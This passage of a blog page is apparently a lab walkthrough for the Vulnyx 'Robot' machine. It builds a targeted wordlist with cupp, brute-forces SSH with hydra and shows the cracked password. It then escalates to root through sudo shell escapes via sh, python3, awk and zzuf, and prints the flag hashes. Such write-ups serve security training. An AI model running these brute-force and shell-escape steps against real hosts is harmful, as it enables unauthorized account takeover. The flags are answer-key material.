class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# cupp -i<br>/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;      \                     # User&quot;</span>)<br>/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;       \   \033[1;31m,__,\033[1;m             # Passwords&quot;</span>)<br>/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler&quot;</span>)<br>/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence <span class="hljs-string">&#x27;\ &#x27;</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;           \033[1;31m(__)    )\ \033[1;m  &quot;</span>)<br> ___________ <br>   cupp.py!                 <span class="hljs-comment"># Common</span><br>      \                     <span class="hljs-comment"># User</span><br>       \   ,__,             <span class="hljs-comment"># Passwords</span><br>        \  (oo)____         <span class="hljs-comment"># Profiler</span><br>           (__)    )\   <br>              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]<br>                            [ Mebus | https://github.com/Mebus/]<br><br><br>[+] Insert the information about the victim to make a dictionary<br>[+] If you don<span class="hljs-string">&#x27;t know all the info, just hit enter when asked! ;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; First Name: Elliot</span><br><span class="hljs-string">&gt; Surname: Alderson</span><br><span class="hljs-string">&gt; Nickname: MrRobot</span><br><span class="hljs-string">&gt; Birthdate (DDMMYYYY): 17091986</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; Partners) name: </span><br><span class="hljs-string">&gt; Partners) nickname: </span><br><span class="hljs-string">&gt; Partners) birthdate (DDMMYYYY): </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; Child&#x27;</span>s name: <br>&gt; Child<span class="hljs-string">&#x27;s nickname: </span><br><span class="hljs-string">&gt; Child&#x27;</span>s birthdate (DDMMYYYY): <br><br><br>&gt; Pet<span class="hljs-string">&#x27;s name: </span><br><span class="hljs-string">&gt; Company name: </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; Do you want to add some key words about the victim? Y/[N]: </span><br><span class="hljs-string">&gt; Do you want to add special chars at the end of words? Y/[N]: y</span><br><span class="hljs-string">&gt; Do you want to add some random numbers at the end of words? Y/[N]:</span><br><span class="hljs-string">&gt; Leet mode? (i.e. leet = 1337) Y/[N]: </span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Now making a dictionary...</span><br><span class="hljs-string">[+] Sorting list and removing duplicates...</span><br><span class="hljs-string">[+] Saving dictionary to elliot.txt, counting 4536 words.</span><br><span class="hljs-string">[+] Now load your pistolero with elliot.txt and shoot! Good luck!</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="四、获取Elliot权限"><a href="#四、获取Elliot权限" class="headerlink" title="四、获取Elliot权限"></a>四、获取Elliot权限</h1><p>根据生成好的字典，进行ssh爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# hydra -t 64 -l elliot  -P ./elliot.txt ssh://192.168.2.54 -F -I<br>Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-21 17:30:09<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 64 tasks per 1 server, overall 64 tasks, 4536 login tries (l:1/p:4536), ~71 tries per task<br>[DATA] attacking ssh://192.168.2.54:22/<br>[STATUS] 536.00 tries/min, 536 tries <span class="hljs-keyword">in</span> 00:01h, 4038 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:08h, 26 active<br>[STATUS] 454.00 tries/min, 1362 tries <span class="hljs-keyword">in</span> 00:03h, 3213 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:08h, 25 active<br>[STATUS] 414.14 tries/min, 2899 tries <span class="hljs-keyword">in</span> 00:07h, 1678 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:05h, 23 active<br>[22][ssh] host: 192.168.2.54   login: elliot   password: toillE71986<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.54 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-21 17:39:22<br></code></pre></td></tr></table></figure>
+
+<p>找到用户<code>elliot</code>的SSH密码<code>toillE71986</code></p>
+<p>获取到用户<code>elliot</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ssh elliot@192.168.2.54                      <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.54 (192.168.2.54)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.54<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">** WARNING: connection is not using a post-quantum key exchange algorithm.</span><br><span class="hljs-string">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span><br><span class="hljs-string">** The server may need to be upgraded. See https://openssh.com/pq.html</span><br><span class="hljs-string">elliot@192.168.2.54&#x27;</span>s password: <br>elliot@robot:~$ <span class="hljs-built_in">id</span><br>uid=1000(elliot) gid=1000(elliot) grupos=1000(elliot)<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取darlene权限"><a href="#1、获取darlene权限" class="headerlink" title="1、获取darlene权限"></a>1、获取darlene权限</h2><p>查看<code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">elliot@robot:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> elliot on robot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User elliot may run the following commands on robot:<br>    (darlene) NOPASSWD: /usr/bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>获取到用户darlene权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">elliot@robot:~$ <span class="hljs-built_in">sudo</span> -u darlene /usr/bin/sh<br>$ <span class="hljs-built_in">id</span><br>uid=1001(darlene) gid=1001(darlene) grupos=1001(darlene)<br>$ bash<br>darlene@robot:/home/elliot$ <br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取angela权限"><a href="#2、获取angela权限" class="headerlink" title="2、获取angela权限"></a>2、获取angela权限</h2><p>查看<code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">darlene@robot:/home/elliot$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> darlene on robot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User darlene may run the following commands on robot:<br>    (angela) NOPASSWD: /usr/bin/python3<br></code></pre></td></tr></table></figure>
+
+<p>获取到用户angela权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">darlene@robot:/home/elliot$ <span class="hljs-built_in">sudo</span> -u angela /usr/bin/python3  -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;)&#x27;</span><br>$ bash<br>angela@robot:/home/elliot$ <span class="hljs-built_in">id</span><br>uid=1002(angela) gid=1002(angela) grupos=1002(angela)<br></code></pre></td></tr></table></figure>
+
+<h2 id="3、获取tyrell权限"><a href="#3、获取tyrell权限" class="headerlink" title="3、获取tyrell权限"></a>3、获取tyrell权限</h2><p>查看<code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">angela@robot:/home/elliot$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> angela on robot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User angela may run the following commands on robot:<br>    (tyrell) NOPASSWD: /usr/bin/awk<br></code></pre></td></tr></table></figure>
+
+<p>获取到用户tyrell权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">angela@robot:/home/elliot$ <span class="hljs-built_in">sudo</span> -u tyrell /usr/bin/awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br>$ bash<br>tyrell@robot:/home/elliot$ <span class="hljs-built_in">id</span><br>uid=1003(tyrell) gid=1003(tyrell) grupos=1003(tyrell)<br></code></pre></td></tr></table></figure>
+
+<h2 id="4、获取root权限"><a href="#4、获取root权限" class="headerlink" title="4、获取root权限"></a>4、获取root权限</h2><p>查看<code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyrell@robot:/home/elliot$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> tyrell on robot:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User tyrell may run the following commands on robot:<br>    (root) NOPASSWD: /usr/bin/zzuf<br></code></pre></td></tr></table></figure>
+
+<p>可以直接执行sh</p>
+<p>获取到root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyrell@robot:/home/elliot$ <span class="hljs-built_in">sudo</span> /usr/bin/zzuf  /bin/sh<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) grupos=0(root)<br></code></pre></td></tr></table></figure>
+
+<h1 id="六、查看FLAG"><a href="#六、查看FLAG" class="headerlink" title="六、查看FLAG"></a>六、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/root.txt /home/elliot/user.txt<br>59d16127fbdecc2832a98726efe3af85<br>40f8c240d5151fa312d6f372b636a12a<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Vulnyx/" class="category-chain-item">Vulnyx</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" class="print-no-link">#图片隐写</a>
+      
+        <a href="/tags/SSH-bruf/" class="print-no-link">#SSH_bruf</a>
+      
+        <a href="/tags/MongoDB/" class="print-no-link">#MongoDB</a>
+      
+        <a href="/tags/Cupp/" class="print-no-link">#Cupp</a>
+      
+        <a href="/tags/Sudo-sh/" class="print-no-link">#Sudo_sh</a>
+      
+        <a href="/tags/Sudo-python3/" class="print-no-link">#Sudo_python3</a>
+      
+        <a href="/tags/Sudo-awk/" class="print-no-link">#Sudo_awk</a>
+      
+        <a href="/tags/Sudo-zzuf/" class="print-no-link">#Sudo_zzuf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Vlx_Robot</div>
+      <div>http://miao-sec.github.io/Vulnyx/Vlx_Robot/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Maze-sec/Mazesec-Worm/" title="Mazesec_Worm">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Mazesec_Worm</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx_Wicca/" title="Vlx_Wicca">
+                        <span class="hidden-mobile">Vlx_Wicca</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
